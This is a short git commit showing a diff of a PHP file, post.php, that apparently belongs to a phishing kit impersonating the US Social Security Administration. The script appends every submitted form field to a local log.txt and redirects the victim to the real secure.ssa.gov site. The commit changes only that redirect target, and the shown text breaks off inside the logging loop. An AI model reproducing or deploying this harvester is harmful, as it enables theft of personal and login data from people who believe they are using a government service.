3ca159d06996e7b67ab9678db8c0cf222b9f1f82
stellawills <76977857+stellawills@users.noreply.github.com>
2021-02-25 02:19:41 +0100

    Update post.php

--- post.php
+++ post.php
@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://secure.ssa.gov/');
+header ('Location: https://secure.ssa.gov/RIR/CaviView.action');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
